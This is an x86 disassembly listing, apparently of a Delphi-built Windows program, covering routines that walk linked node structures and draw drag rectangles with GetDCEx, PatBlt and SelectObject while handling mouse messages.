mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4459c4
pop ecx
mov eax ebx
call sub_403224
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4459c4
pop ecx
sub_4459f8
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_4459c4
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403224
xor eax eax
mov [ esi + 0x64 ] eax
sub_445a54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444a64
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_445a90
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_445a90
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_445cfd
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov edx [ ebp - 0x8 ]
pop eax
call sub_404224
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
mov eax [ ebx + 0x14 ]
call sub_4441f0
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov edx [ ebp - 0x10 ]
pop eax
call sub_404224
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403224
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445d04
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f80
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_4445a0
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_444718
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_444754
mov eax [ ebx + 0x18 ]
call sub_4445a0
mov [ edx + 0x18 ] eax
push esi
push sub_4462a0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_444acc
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_444754
mov eax [ esi + 0x64 ]
call sub_444718
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403224
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_446278
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403224
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_44429c
mov edx eax
mov eax edi
call sub_444740
mov eax edi
call sub_4445a0
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_4462a0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_444acc
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_4462a0
mov edx [ eax + 0x14 ]
mov eax esi
call sub_444acc
mov eax [ ebx + 0x14 ]
call sub_403224
mov eax edi
call sub_403224
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_445d0c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_440efc
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407aec
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_444740
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_440e68
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_444740
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_446128
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_4462a0
xor edx edx
mov eax edi
call sub_444acc
sub_445de8
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_444718
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402a5c
mov edx eax
mov eax ebx
call sub_444740
sub_445e24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40440c
xor eax eax
push ebp
push sub_445e8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40421c
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445e96
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_445e9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_445f4b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4444a8
mov eax [ ebp - 0x8 ]
call sub_445e24
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_445e9c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445f52
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_445e9c
pop ecx
sub_445f58
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_446091
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_446040
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_440e68
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446047
mov eax [ ebp - 0x10 ]
call sub_403224
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_445e24
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_440e7c
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_446047
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_445e9c
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446098
lea eax [ ebp - 0x14 ]
call sub_403f5c
retn
sub_4460a0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4447f0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_444818
call sub_4460a0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4447f0
call sub_4460a0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_444220
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_444718
mov edx eax
mov eax ebx
call sub_444740
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_444740
jmp r-xdata
sub_446128
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_4460a0
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_44616c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_444718
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_444740
sub_44619c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_4423cc
mov edx eax
mov eax [ rw-data ]
call sub_446cfc
mov eax [ ebx + 0x14 ]
call sub_4423cc
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_4462b0
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4461fc
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_446cfc
mov eax ebx
call sub_4462b0
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_444740
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_444740
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_446128
push ebx
push sub_4462a0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_444acc
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_446278
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_440e68
test eax eax
jle r-xdata
push ebx
push sub_4462a0
xor edx edx
mov eax ebx
call sub_444acc
sub_4462b0
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_4442e4
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_4442e4
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_444350
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_444350
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41ccc4
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44639c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44639c
pop ecx
mov eax ebx
call sub_444718
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444718
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44639c
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_444718
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_421f1c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_44642c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_444718
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_44429c
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_444718
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44639c
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44647c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_43b56c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43b56c
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_4464f8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4441a8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_444254
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_4447fc
test eax eax
je r-xdata
mov eax esi
call sub_444220
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_4462a0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_444acc
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4447fc
mov edx [ ebx + 0x20 ]
call sub_444754
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_4464f8
pop ecx
sub_446578
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_444204
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_444204
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_4447fc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_446578
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_4462a0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_444acc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_444400
mov eax edi
call sub_4447f0
test eax eax
je r-xdata
mov eax edi
call sub_4447fc
mov esi eax
mov eax esi
call sub_444718
push eax
mov eax esi
call sub_444254
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_4447f0
call sub_444718
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_444718
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_444740
mov eax esi
call sub_444718
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_444740
mov eax edi
call sub_4447fc
call sub_444790
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_444254
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_444740
mov eax edi
call sub_4447f0
call sub_444790
mov bl 0x1
jmp r-xdata
sub_4466b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_444a64
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_4124bc
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_445258
test eax eax
je r-xdata
push ebp
call sub_4464f8
pop ecx
push ebp
call sub_446578
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_44647c
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_446738
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_4442e4
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_4442e4
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44642c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44642c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_4467c8
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446ba0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406878
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_445258
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4461fc
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406878
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_445258
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43b710
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446ba7
lea eax [ ebp - 0x48 ]
call sub_403f5c
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
